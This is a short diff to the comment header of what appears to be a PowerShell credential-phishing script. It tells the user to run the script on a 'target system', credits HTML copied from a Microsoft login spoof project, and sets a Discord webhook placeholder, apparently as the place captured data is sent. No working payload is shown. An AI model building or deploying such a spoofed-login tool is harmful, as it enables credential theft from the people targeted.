@@ -10,6 +10,7 @@ SETUP
 USAGE
 1.Run script on target system.
 
+The HTML for this script was borrowed from https://github.com/JoniRinta-Kahila/microsoft-login-spoof, kudos for creating this great look-a-like! 
 #>
 
 $dc = 'DISCORD_WEBHOOK_HERE'
